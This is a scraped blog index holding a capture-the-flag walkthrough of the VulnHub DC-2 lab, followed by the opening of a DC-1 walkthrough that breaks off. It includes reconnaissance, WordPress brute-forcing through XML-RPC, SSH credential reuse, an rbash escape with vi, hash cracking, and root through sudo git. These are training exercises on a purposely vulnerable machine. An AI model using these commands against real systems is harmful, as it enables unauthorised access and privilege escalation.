","date":"01-31-2023","objectID":"/dc-2/:1:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Finding DC-2‚Äôs IP Once you‚Äôve imported, configured, and started the DC-2 VM, let‚Äôs acquire its IP by running sudo netdiscover -r *IP*/*CIDR* from our attack box‚Äôs terminal. -r specifies the IP range by IP/CIDR notation. (There‚Äôs always another way to reach a similar outcome, so feel free to use your own techniques/tools to acquire DC-2‚Äôs IP address.) If you see two asterisks surrounding some characters, like *IP*, removal of the asterisks and inserting the appropriate characters is needed. In this case, *IP* and *CIDR* need replaced by the IP address(e.g. 192.168.56.0) and subnet mask shorthand via CIDR(/24), in which DC-2 exists, respectively. Depending on my attack system‚Äôs interface/routing configuration, I may have to run the netdiscover command with the -i option. -i specifies which interface I want the ARP requests to be sent through. As I‚Äôm running multiple NICs, a VPN, and virtualbox, on this particular attack box, I have to run the following command to grab DC-2‚Äôs IP: sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 PS You‚Äôll need to CTRL+C to exit netdiscover. netdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2 Now that we have DC-2‚Äôs IP address, let‚Äôs move onto setting up environment variables through the attack box‚Äôs terminal. ","date":"01-31-2023","objectID":"/dc-2/:2:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exporting Environment Variables To speed up a few future commands, let‚Äôs export a few environment variables to include the IP address we obtained earlier. export IP=\"*IP*\" ‚Äì\u003e This will create a variable, named $IP, containing DC-2‚Äôs IP address. - e.g. export IP=\"192.168.56.111\" export URLdir=\"http://*IP*/FUZZ/\" ‚Äì\u003e Variable for fuzzing directories. We append a forward slash / to specify directories. - e.g. export URLdir=\"http://192.168.56.111/FUZZ/\" export URLfile=\"http://*IP*/FUZZ\" ‚Äì\u003e A var useful for fuzzing files. - e.g. export URLfile=\"http://192.168.56.111/FUZZ\" Let‚Äôs make sure we‚Äôve exported the variables correctly by running echo $IP; echo $URLdir; echo $URLfile echo our $IP, $URLdir, $URLfile vars PS If you ever export variables and then create a second shell, the second shell will only contain the previously exported variables if it‚Äôs a child shell of the first. ","date":"01-31-2023","objectID":"/dc-2/:3:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration At this point, we‚Äôre set to start scanning and enumerating DC-2! Since this is a blog post, I‚Äôm going to keep things somewhat short but feel free to dig into anything/everything you can. If you find another path to go down, do it! It can help you learn what to look for and how to prioritize those initial findings. This phase of a pentesting process can and should consume the largest amount of time, as you‚Äôre wanting to find everything you can. Not only will this help if you were to get stuck but, if this were a real world pentest, you‚Äôd want to provide the customer an accurate report by being thorough! ","date":"01-31-2023","objectID":"/dc-2/:4:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"nmap scan Anyways, let‚Äôs get to it by starting with a nmap scan against DC-2‚Äôs IP. nmap $IP -T4 -p- -sC -sV --open $IP ‚Äì\u003e is the previously exported IP address of DC-2. -T4 ‚Äì\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap‚Äôs Timing Templates webpage. -p- ‚Äì\u003e tells nmap to scan ALL 65,535 TCP ports. -sC ‚Äì\u003e specifies nmap to run default scripts. -A includes this. -sV ‚Äì\u003e enables version detection. -A includes this. --open ‚Äì\u003e only shows ports that are ‚Äúopen‚Äù. Safe against a purposely vulnerable box but not suggested for a real pentest as it may hide a reportable finding. nmap results - Linux box w/ http on 80, ssh on 7744 Analyzing nmap scan Debian Linux running services http(port 80) and ssh(port 7744). http(80) may only be accessible via hostname and not IP. Needs tested. Many reasons to this but maybe it‚Äôs hosting more than one webapp? Think VHOST. ssh(7744) running on non-default port but that doesn‚Äôt particularly mean anything. ","date":"01-31-2023","objectID":"/dc-2/:4:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Manual inspection of http(80) Let‚Äôs open a browser and visit the target IP(DC-2) and see what it shows. It‚Äôs redirecting us to ‚Äúhttp://dc-2/‚Äù domain? If you look at the nmap results, you‚Äôll see nmap already reported this to us. ‚ÄúDid not follow redirect to http://dc-2/‚Äù I‚Äôd suspect that port 80 is configured with a name-based virtual host, meaning that one IP address could host multiple sites served by the hostname only. ","date":"01-31-2023","objectID":"/dc-2/:4:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Adding DC-2 to /etc/hosts In order to tell our attack box that we want $IP to resolve to DC-2, we simply add this information to the /etc/hosts file on the attackbox. Once we‚Äôre finished with the DC-2 box, we‚Äôll simply revert this change. sudo nano /etc/hosts A few spaces below the existing content, let‚Äôs add *IP* dc-2. NOTE! Spacing between the IP address and hostname is (1) TAB! Not spaces via SPACEBAR. Now we do keyboard combos of CTRL+O then ENTER(to save it) followed by CTRL+X(to exit) Now confirm the changes by running cat /etc/hosts End result.. added dc-2 into /etc/hosts ","date":"01-31-2023","objectID":"/dc-2/:4:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Rerun nmap after /etc/hosts update Look how our redirect is working and nmap is able to grab the proper banners! nmap results after /etc/hosts update - proper banners ","date":"01-31-2023","objectID":"/dc-2/:4:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Reinspecting http(80) Let‚Äôs visit http://dc-2 in our browser.. Access to the webapp, finally! Looks like WordPress. Wordpress CMS found CMS stands for Content Management System. It‚Äôs an app that allows multiple contributors to create, manage, and modify content on a website. Wordpress(WP) is a common CMS in the wild. ","date":"01-31-2023","objectID":"/dc-2/:4:5","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating our notes Let‚Äôs notate what we‚Äôve found and what possible tools/techniques to try. As we move forward, let‚Äôs continue to update our notes. Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 80 : Apache httpd 2.4.10 Added ‚Äú192.168.56.111 dc-2‚Äù to attackbox /etc/hosts to allow access of WP CMS 80 : Wordpress 4.7.10 What to try: view source, file/directory busting/fuzzing, wpscan 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) What to try: searchsploit for vulns When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:6","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Fuzzing http/80 Now that we can access the webapp as intended, let‚Äôs move onto fuzzing! Fuzzing is a technique used to inject something into an app and filter the responses. Since we‚Äôre dealing with a webapp, we‚Äôll be using a tool called wfuzz to brute-force the webapp‚Äôs file and directory paths. wfuzz will simply brute-force the webapp‚Äôs file/directory parameter(or wherever we place the wordFUZZ), against a specified wordlist. For each word sent, it‚Äôll record the webapp‚Äôs response. We then filter out the responses we don‚Äôt need, like 404‚Äôs, and a list is created! This can help us find hidden login pages, accidentally exposed files, etc. and save us lots time! There‚Äôs various tools that can accomplish this task e.g. dirbuster, ffuf, wfuzz, etc but today I‚Äôll stick with wfuzz. I‚Äôll make sure to use different tools on DC-3, so we don‚Äôt become repetitive and boring. Promise! üòâ I suggest you try any trusted tools and find your favorites. Go check out the resources page as it contains a large list of tools. Fuzzing $URLfile Let‚Äôs start with fuzzing files by running the following command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c ‚Äì\u003e provides a color output for the webapp‚Äôs response column. -z file,/*wordlist* ‚Äì\u003e specifies payload type and points to file wordlist. --hc 403,404 ‚Äì\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile ‚Äì\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. Let‚Äôs manually visit each recorded response, in our browser, to see what it presents! ignore the last 404 Wordlist Tip If you lack the SecList wordlists(already included in Kali‚Äôs repo), you can find it at Daniel Miessler‚Äôs Github Page. It‚Äôs a collection of various lists that can be used for various assessments! Very useful! SecLists works great for CTFs but for real world pentesting, you‚Äôll may be using custom or something found in my resources posts. wfuzz results - files files worth notating http://dc-2/xmlrpc.php ‚Äì\u003e XML-RPC API? We can use this to brute-force logins without restrictions. The wpscan tool can abuse this. We‚Äôll use wpscan later! http://dc-2/wp-login.php ‚Äì\u003e wp login page Potential login abuse techniques? Think email/user enumeration or brute-forcing. http://dc-2/readme.html ‚Äì\u003e info disclosure. versioning? PHP, MySQL, mod_rewrite apache module? Injections? Targeted exploits? http://dc-2/wp-links-opml.php ‚Äì\u003e info disclosure. WP 4.7.10 confirmed Fuzzing $URLdir Let‚Äôs now fuzz against directories. We‚Äôll simply change the exported variable and wordlist options in our previous command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 $URLdir -z file,/*wordlist* ‚Äì\u003e changed to a directories wordlist. $URLdir ‚Äì\u003e exported variable that includes appended backslash, so wfuzz searches for directories. Let‚Äôs manually visit each recorded response, in our browser, to see what it presents! ignore the last three responses wfuzz results - directories directories worth notating http://dc-2/wp-includes/ ‚Äì\u003e contains core WP file/folders http://dc-2/wp-includes/css/jquery-ui-dialog.min.css shows jQuery 1.11.4? Version may be wrong when compared to whatweb. http://dc-2/wp-admin/ ‚Äì\u003e contains file/folders to the WP dashboard panel but redirects to /wp-login.php http://dc-2/wp-content/ ‚Äì\u003e contains plugins/themes for WP ","date":"01-31-2023","objectID":"/dc-2/:4:7","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Confirm WebTech with Wappalyzer Regarding the potential WebTech findings in the /readme.html file, let‚Äôs confirm those by visiting the site with a browser extension called Wappalyzer. To start using, simply: Install it through the browser‚Äôs extension manager Visit http://dc-2 with our browser and see which tech stack it‚Äôs using. Wappalyzer Results We‚Äôre able to confirm: Wordpress 4.7.10 ‚Äì\u003e Confirmed with nmap after /etc/hosts update Apache HTTP Server 2.4.10 ‚Äì\u003e Confirmed with nmap PHP ‚Äì\u003e Found potential use through /readme.html. Version 5.2.4? Debian ‚Äì\u003e Found through apache 404 error. Info Disclosure MySQL ‚Äì\u003e Found in /readme.html. Version 5.0? jQuery 1.12.4 and jQuery Migrate 1.4.1. Versioning is off to our 1.11.4 finding. ‚Äì\u003e Found in /wp-includes directory. Version 1.11.4? Twenty Seventeen Theme ‚Äì\u003e Found with wpscan. Version 1.2? ","date":"01-31-2023","objectID":"/dc-2/:4:8","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Findings \u0026 Updating Notes We have some additional info to add into our notes. Let‚Äôs also create a to-do section. PS If you attempt admin:password, at the /wp-login page, you‚Äôll see that username enumeration is possible! If the XML-RPC API wasn‚Äôt enabled, we could possibly attack this login page. /wp-login.php user enum possible TO-DO LIST Things to check: Use wpscan to: enumerate usernames brute-force WP login by abusing the XML-RPC API? Maybe create a custom wordlist? Hint from Flag 1 referencing a tool called cewl. Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP ‚Äì\u003e admin , 80 : Apache httpd 2.4.10 Added ‚Äú192.168.56.111 dc-2‚Äù to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan can be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:9","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"wpscan - Enumerating Usernames wpscan is a wordpress security scanner that allows us to assess wordpress apps. Our goal is to use wpscan to enumerate usernames, cewl to create a custom password list, and finally use wpscan to brute-force logins via the XML-RPC API that‚Äôs enabled, as it doesn‚Äôt limit login attempts. To enumerate users with wpscan, simple run wpscan --url http://dc-2. Looks like we have three WP users, including the admin user we‚Äôve already confirmed via /wp-login.php. Let‚Äôs add these users to our notes. admin; jerry; tom wpscan - user enumeration ","date":"01-31-2023","objectID":"/dc-2/:4:10","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"CeWL - Creating word lists CeWL, Custom Word List Generator, spiders the specified URL and creates a list per the flags specified. After a little googling(google is your friend!), it looks like wordpress uses a 10 character minimum requirement. So, we‚Äôll be sure to use the flag -m with a argument of 10 to specify this minimal length requirement. If you haven‚Äôt already, create a folder to store any related dc-2 files into, including the next cewl file we create. Now let‚Äôs run the cewl tool! cewl http://dc-2:80/ -m 10 -w $PWD/dc-2-cewl.txt -m 10 ‚Äì\u003e specifies the minimum length of 10 characters -w $PWD/dc-2-cewl.txt ‚Äì\u003e tells cewl to export file name ‚Äúdc-2-cewl.txt‚Äù into the current working directory(var of $PWD) cat dc-2-cewl.txt and you‚Äôll see these results. cewl results Let‚Äôs also create a list for usernames called dc-2-users.txt, so we can use it along side the password list, dc-2-cewl.txt, we just created. echo -e \"admin\\njerry\\ntom\" \u003e dc-2-users.txt -e‚Äì\u003e echo recognizes \\n(new line), and others additional syntax. \u003e ‚Äì\u003e overwrites data in the ‚Äúdc-2-users.txt‚Äù file Now that we have some usernames and a custom password wordlist, let‚Äôs update our notes and then exploit the XML-RPC API üòÉ ","date":"01-31-2023","objectID":"/dc-2/:4:11","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating notes before exploiting TO-DO LIST Things to check: Use wpscan to: Brute-force WP XML-RPC with wpscan, dc-2-users.txt, and dc-2-cewl.txt After we get into wordpress, look for injection points, vulnerable plugins, etc Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP(admin;jerry;tom) 80 : Apache httpd 2.4.10 Added ‚Äú192.168.56.111 dc-2‚Äù to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan will be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:12","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exploiting ","date":"01-31-2023","objectID":"/dc-2/:5:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing WP XML-RPC XML-RPC is an API that allows another application to publish, edit, delete posts, upload new files, get a list of commands, edit comments all through a POST request. The reason this API is nice for attacks is there‚Äôs no limits or throttling to the amount of requests we send, plus it allows access to many different WP features. Since we‚Äôre going to be brute-forcing the login creds of a wordpress site, wpscan will first check and, if present, use this XML-RPC API as the attack vector. If it is absent, wpscan will shift to using the wp-login.php login fields. ","date":"01-31-2023","objectID":"/dc-2/:5:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Validating WP Creds Let‚Äôs get to it and run the attack against XML-RPC wpscan --url http://dc-2/ --disable-tls-checks -U dc-2-users.txt -P dc-2-cewl.txt --url ‚Äì\u003e specifies the URL to attack which is DC-2‚Äôs WP site --disable-tls-checks ‚Äì\u003e disables TLS checks for HTTPs as we‚Äôre on HTTP -U ‚Äì\u003e location of the username list to be used -P ‚Äì\u003e location of the password list to be used wpscan - verified two valid combinations We have two valid credentials for WP; jerry:adipiscing tom:parturient After logging into both accounts, it looks like they‚Äôre limited accounts. I was unable to upload *.php files through the media upload form. The plugins and themes pages are also absent, meaning we lack access to abusing them. So, without digging into this further, I think we‚Äôre meant to go about this by other means. So, let‚Äôs try using the credentials, we validated against wordpress, against the SSH service on port 7744! Maybe we‚Äôll get lucky and get ssh access into the debian server(dc-2). ","date":"01-31-2023","objectID":"/dc-2/:5:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Credential reuse on SSH/7744 Let‚Äôs try logging in as jerry: ssh jerry@dc-2 -p 7744 answer yes try adipiscing ‚Äì\u003e Permission denied, please try again. try parturient ‚Äì\u003e Permission denied, please try again. CTRL+C to cancel our attempts as jerry Try again but with username ‚Äútom‚Äù: ssh tom@dc-2 -p 7744 try parturient We‚Äôre in!!! tom@dc-2 -p 7744 successful! ","date":"01-31-2023","objectID":"/dc-2/:5:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Escaping a Restricted Shell We‚Äôve gained shell but it‚Äôs restricted. By running ls $PATH, we‚Äôll see that we are limited to four binaries: less, ls, scp, vi If you run any other command, you‚Äôll see the -rbash reference meaning ‚Äúrestricted bash‚Äù. rbash - restricted bash So first thing is first, we need to escape this restricted shell that user ‚Äútom‚Äù is restricted to. We can use vi to escape the restricted shell. In our SSH terminal: vi type :set shell=/bin/bash then enter type :shell then enter This will escape the restricted shell and we can confirm by running cd /. Once we‚Äôve gained shell, it‚Äôs nice to establish a proper and stable shell with tty. As we‚Äôre connected through SHH, we won‚Äôt need to spawn a shell through python but setting up PATH variables, etc will make our life easier. Anything struck-through represents that the command isn‚Äôt needed as we‚Äôre using SSH to establish a stable shell. python -c 'import pty; pty.spawn(\"/bin/bash\")' ‚Äì\u003e spawn an interactive shell via python export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp ‚Äì\u003e setting additional PATH variables export TERM=xterm-256color ‚Äì\u003e provides us some color in our output alias ll='ls -lsaht --color=auto' ‚Äì\u003e sets an alias ll that runs ls -lsaht --color=auto Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 We should now have a unrestricted, fully interactive tty shell, with a ll command that runs ls -lsaht --color=auto BUT we‚Äôre still restricted in the form of system permissions. Hence, we‚Äôre moving onto privesc! ","date":"01-31-2023","objectID":"/dc-2/:5:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Privilege Escalation ","date":"01-31-2023","objectID":"/dc-2/:6:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Enumerating user tom Let‚Äôs run through some simple enumeration of the current user, tom, and see if we can find anything to steal or exploit! sudo -l ‚Äì\u003e requests for a password and no password, we know, works. find / -perm -u=s -type f 2\u003e/dev/null ‚Äì\u003e as we lack sudo, none of the SUID or GUID binaries allow for privesc abuse. mysql access is denied for tom. Same issue with sudo. No working password. (It‚Äôs forcing us to follow a path‚Ä¶) cat ~/.bash_history ‚Äì\u003e nothing interesting in bash history. Let‚Äôs not forget that we may have access to the WP CMS webroot! Maybe we can steal sensitive information within the database? cd /var/www/html ‚Äì\u003e Looks like we now have access to the WP files! After digging around in the html folder, I found that the wp-config.php contains MySQL creds! wpadmin:4uTiLL wpadmin:4uTiLL creds in wp-config.php Future me reporting in‚Ä¶ To root this box, we‚Äôre not needing to gather this SQL info nor do we need to crack hashes. We could skip this section and move onto Abusing jerry‚Äôs sudo privs with git but what‚Äôs the fun in that! ","date":"01-31-2023","objectID":"/dc-2/:6:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Hash algorithms w/ hash-identifier We have three hashes to crack. admin:$P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY. tom:$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO. jerry:$P$BRCcbpudGlBukTwA7kJsb.rafAL4il. To crack them, we‚Äôll be using a tool called hashcat, but first, we need to determine which hash algorithm was used. SHA1, MD5, etc? hash-identifier is the perfect tool for this. Open up a new terminal and leave our current SSH connection alone, as we still need it! hash-identifier ‚Äì\u003e this will execute and open the program‚Äôs CLI. We will simply copy/paste one of the hashes into the command-line and hit the ‚Äôenter‚Äô key. hash-identifier responds with MD5(wordpress) Hit CTRL+C, to exit, and let‚Äôs now get into hashcat We now know we‚Äôre dealing with a MD5(WordPress) hash algorithm. ","date":"01-31-2023","objectID":"/dc-2/:6:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat hashcat is a ‚Äúpassword recovery‚Äù tool that utilizes your CPU and, if properly configured, your GPU to crack hashes. In this example, we‚Äôll be using the CPU. Technique becomes very important when cracking hashes, as it may differentiate between minutes vs days when cracking a hash We know the hashes were made using the ‚ÄúWordpress(MD5)‚Äù algorithm, so we need to make sure we tell hashcat this. Let‚Äôs start by looking up which argument we should provide to the flag -m. m is the flag that we use to specify which algorithm we‚Äôre attacking. There‚Äôs many lists our there but here‚Äôs a quick reference. Generic Hash Types Simply CTRL+F for ‚ÄúWordPress‚Äù and you‚Äôll land on a argument value of 400. Now we know which argument value to provide the flag -m. PS - Export the three found hashes, that were in the MySQL database, into a text file as we‚Äôll need to specify that file in our hashcat command Let‚Äôs attack the hashes with our previously created cewl list called dc-2-cewl.txt. hashcat -m 400 -a 0 *location/hashes-to-crack.txt* dc-2-cewl.txt m ‚Äì\u003e specifies the algorithm the hashes were created with. a 0 ‚Äì\u003e tell hashcat to do a straight attack, meaning it‚Äôll run straight through each word without altering it‚Äôs structure/order of characters. We‚Äôre able to crack the two previously found passwords but not the admin password‚Ä¶ $P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.:parturient $P$BRCcbpudGlBukTwA7kJsb.rafAL4il.:adipiscing two hashes cracked, admin not cracked Since we have the hashes and know the algorithm, we could crack the admin password at a later time but I‚Äôll pass. We‚Äôve stolen the sensitive data from the MySQL database and ran through some cewl / hashcat examples. The concepts are what matter here. üòÉ ","date":"01-31-2023","objectID":"/dc-2/:6:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing jerry‚Äôs sudo privs with git Since it seems the box wants us to go for jerry now(tom \u0026 jerry cartoon‚Ä¶), let‚Äôs login as jerry by: su jerry ‚Äì\u003e enter the WP password we found for jerry ‚Äì\u003e adipiscing We‚Äôre in as jerry! sudo -l ‚Äì\u003e looks like jerry has root privs to the binary git jerry - sudo -l shows git as root! What do you know‚Ä¶ git can be abused(confirmed via GTFObins), if the user has sudo perms, to gain privesc! Let‚Äôs gain root! sudo git -p help config ‚Äì\u003e enter !/bin/sh ‚Äì\u003e enter ","date":"01-31-2023","objectID":"/dc-2/:6:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"ROOTED! ROOTED! ","date":"01-31-2023","objectID":"/dc-2/:7:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-1 from the DC-Series(VulnHub).","date":"01-20-2023","objectID":"/dc-1/","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Let‚Äôs root DC-1! Details can be found at https://www.five86.com/dc-1.html Open this to see the box's overview pulled from the above website. DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root‚Äôs home directory. You don‚Äôt even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. If you‚Äôre ever needing to find the IP of a local box, sudo netdiscover -r *ip/cidr* will do the trick. -r specifies the range. If this tool doesn‚Äôt work, you could have routing issues. -i can specify the interface you need to run against. Another nifty tool is ip route get *ip* as this will tell you what route a packet will take to the ip specified. Anyways.. to the box! ","date":"01-20-2023","objectID":"/dc-1/:0:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Export Environment Variables Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address. Your IP value will most likely differ, so adjust accordingly: export IP=\"192.168.56.110\" export URLdir=\"http://192.168.56.110/FUZZ/\" \u003c‚Äì Directories export URLfile=\"http://192.168.56.110/FUZZ\" \u003c‚Äì Files appended backslash depicts directories vs files üòÉ You can then test your exported vars by running echo $varname: e.g., echo $IP would respond with 192.168.56.110. ","date":"01-20-2023","objectID":"/dc-1/:1:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Scanning \u0026 Enumeration Before we move forward, let‚Äôs make a list that‚Äôll include the important bits as we move forward. We‚Äôll add/update as we go through the box, so we can reference it. Box Name: DC-1 IP: 192.168.56.110 ","date":"01-20-2023","objectID":"/dc-1/:2:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"nmap Let‚Äôs start with a simple nmap scan to see what we‚Äôre playing with: nmap $IP -T4 -p- -A --open $IP = target‚Äôs IP via exported variable. -T4 = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap‚Äôs Timing Templates webpage. -p- = Tells nmap to scan all ports(TCP by default).. -A = Runs four options under one: OS detection Version detection Script scanning Traceroute --open = runs -A only against ports that are open. Idea is to speed up slow scans. Running a local box won‚Äôt cause much issues but when you‚Äôre running a slower scan or the latency is high, this option can help. DC-1 nmap scan Let‚Äôs start with port 80 as it‚Äôs most likely the weakest entry point due to the potential services listed in robots.txt. SSH, on port 22, isn‚Äôt much use as we currently lack keys, usernames, and passwords. We could brute force but it‚Äôll take a while and it‚Äôs not guaranteed to work. rpc could be of use but I‚Äôm not seeing anything obvious in the list of services, so we‚Äôll skip this for now. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22- Drupal CMS v7.xx - \u003c‚Äì Focus here first 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"01-20-2023","objectID":"/dc-1/:2:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Manual Inspection of 80/webapp Open up a browser and enter the box‚Äôs IP address to visit the IP‚Äôs http service. Since it‚Äôs running on port 80, there‚Äôs no need to specify the port eg. 192.168.56.110 :80 DC-1 http service Manually inspect the page source. Findings are: Drupal 7 = nmap already told us this Page Source of Drupal Let‚Äôs see if we can enumerate the responses regarding the login fields at the /user/ directory No response allows us to differentiate between username nor passwords. If we could get a response saying ‚ÄúThis email does not exist‚Äù, then that would allow us to brute force enumerate emails. Login Enum Fail Same goes for recovering an account. Forgot Enum Fail Default credentials? Seems like that‚Äôs a negative. Drupal forces a password change when logging in for the first time. Answer found via google üòÉ /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting. sqlite mysql php POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found. POST also shows PHP/5.4.45-0+deb7u14. nmap didn‚Äôt see this. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ? 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"01-20-2023","objectID":"/dc-1/:2:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Fuzzing webapp/80 I tried fuzzing but it didn‚Äôt result in anything interesting beyond what robots.txt already told us. Example commands would be‚Ä¶ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir I also tried dirbuster with similar results. Some results I got were: 000000007: 200 54 L 164 W 3151 Ch 